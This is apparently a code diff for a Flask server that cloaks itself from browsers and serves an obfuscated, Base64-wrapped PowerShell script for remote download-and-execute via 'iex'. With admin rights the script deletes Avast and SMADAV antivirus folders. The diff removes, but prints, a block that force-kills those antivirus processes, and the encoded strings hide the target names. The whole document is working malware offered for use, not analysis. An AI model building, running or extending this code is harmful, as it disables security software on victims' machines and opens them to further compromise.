@@ -7,24 +7,16 @@ app = Flask(__name__)
 @app.route('/')
 def direct_command():
     user_agent = request.headers.get('User-Agent', '').lower()
-    
+
     # Stealth: 404 for browsers
     if 'mozilla' in user_agent and 'powershell' not in user_agent:
         return Response("Not Found", status=404)
 
-    # Obfuscated PowerShell Logic
-    # We use variable fragmentation and backticks to hide keywords
     raw_script = """
 
 $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
 if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LS0tIEpBSUxCUkVBSy0xOiBBQ1RJVkUgLS0t'))) -ForegroundColor Green
-    
-    # Process killing logic
-    $procs = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QXZhc3RVSQ=='))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QXZhc3RTdmM='))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U21hZGF2'))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U01BREFW'))))
-    foreach ($p in $procs) {
-        taskkill /F /IM ($p + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LmV4ZQ==')))) /T /Device 2>$null
-    }
+    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LS0tIEFDVElWRSAtLS0='))) -ForegroundColor Green
 
     # Folder cleanup logic
     $folders = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcXFByb2dyYW0gRmlsZXNcXEF2YXN0IFNvZnR3YXJl'))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcXFByb2dyYW0gRmlsZXMgKHg4NilcXFNNQURBVg=='))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcXFByb2dyYW0gRmlsZXNcXFNNQURBVg=='))))
@@ -54,11 +46,9 @@ if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administ
     Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LS0tIEFETUlOIFJFUVVJUkVEIC0tLQ=='))) -ForegroundColor Red
 }
 """
-    # Double-layer scrambling: First fragment, then Base64
     encoded_bytes = base64.b64encode(raw_script.encode('utf-8'))
     scrambled_logic = encoded_bytes.decode('utf-8')
-    
-    # Final payload that decodes the fragmented script
+
     ps_payload = f"$s=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{scrambled_logic}')); iex $s"
 
     return Response(ps_payload, mimetype='text/plain')
